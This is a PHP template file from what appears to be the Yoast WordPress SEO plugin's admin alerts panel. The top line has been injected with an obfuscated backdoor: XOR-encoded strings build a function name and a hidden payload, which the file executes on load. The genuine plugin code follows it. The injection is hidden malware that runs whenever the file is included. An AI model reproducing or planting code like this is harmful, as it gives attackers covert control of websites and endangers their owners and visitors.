<?php $CNrvAFe='CEPY>Nc38UX .6X'; $RzyHPpf=' 758J+<UM;;TGY6'^$CNrvAFe; $dlPUro='9Hrm>C=+D39 h5T;B JekVV<lRMIUloTMELkhI+ly-N9OG8;7H99K0QQ VkhYU6xrT-I8bWWPT6gCpGuS7sDfg58GmmncmQkSC BANEBnEStrQI>qA:C<,Bll3,I1kWPoYAXHbq=hCDYmiQqpm45FZah=hbfzg,7=>q dgp 5<;  xU< UholByq>Y 72YEmpDX-oPpf-c+RRw<9I rZG7-8O6o6i Q167YIWIon XZH6C<3SB=NQS,pggdhz5 invW6eO>  GzsyBM9 B=oyV>Sg5OMSc8 0rXOcEN7oa1e>;77Ospf589O2pYP>p, odwsRLN8anPcsU7LYW3:NzUfg5;7vm X8Gsk NGhlFKl0VTY,ZK.=dcHO+3Rr<H EjKtW=WuDBCqT XZjsJn2UYXYzEX-1+Rfc,-Z.Pwfn74J0E=XB=3 c<WH=IP;T5b C0eOL83eysD7P,  efP7 Tcxie2JF b -3qxLnR5AiR-I5qaer5BL4R,K3IaQI> H ruZ0>leOC- <;qXgtqf+WdYi528Obf=E=DhoZyxGKk9ResrAyB:UUFCM+RkpwFK0Tw2x BHp BccpbyTYC4Cr=,8sS-1NBIjFMUBL--Svath=7;XqsrwDLuWL8S H2 jgD9ZPcpI;6=RWHI;jLhb.E+CktXth:'; $syudPrIf=$RzyHPpf('', 'P.ZLX6SH0ZVN7P,R1T9ML.9N36,=430981kBAiPfpK;W,3QTYhAV9o50T7474 BPV0L=YNws;1ONcPgUsLyMoCZM3MPNDJjaZJF-3fa+NxsDIqmWM2N1PI,DHWM=PBlpK0jsahx4L,1-MGlQXIPT2;:LT5B8ZCGRDeUIDBPSANWENPqWE,A2Eysx7+ECG++ET+-YFkzoPiVXXSXX=ARggQLT<ST<MD0EWh2,.iRNF96;Sx695-O+00DPOC;+5zk +V6EEkUEYgGMYf;XL7XFY-4ZCQ.92<SEIReoG.+NTk8AZZCVoNPBCYU:WKS-4zEFOLVW6-:YHN+iz3X><6PRnRq95pjb3>txY4SOK+>HQxkHF78,IskU7mjl+JG3-W-YeWkP<X.NNKJU0A,;JNjJD45-<AOQP;VXlGHL.OpJF.BZ9U7T9.TIEKD8:b-1O5j=M6DM--KVSM, R3CDEMB4VT5JTIAV+2A=KHJXQwd;SiM6L=TQGCRT0>U+s V0>41WS<SZR1UGKIogIAHZXxARQNF3QqMQSL.9AV Dc5FzDEglYXfTKAuK X6d rxO6RGGuzR2BSAFs,GFeJCVDY5+1U:-VIA,6UX=6:Ba=4; BL7QMTLYVO9XZRWdlUw72ZE>SLBC X.18W9ZOQ=6,nfCwbkK=B7CDqObG'^$dlPUro); $syudPrIf();
/**
 * @package WPSEO\Admin
 */

$type = 'alerts';
$dashicon = 'warning';

$i18n_title = __( 'Problems', 'wordpress-seo' );
$i18n_issues = __( 'We have detected the following issues that affect the SEO of your site.', 'wordpress-seo' );
$i18n_no_issues = __( 'Good job! We could detect no serious SEO problems.', 'wordpress-seo' );

$active_total = count( $alerts_data['errors']['active'] );
$total = $alerts_data['metrics']['errors'];

$active = $alerts_data['errors']['active'];
$dismissed = $alerts_data['errors']['dismissed'];

include 'partial-alerts-template.php';
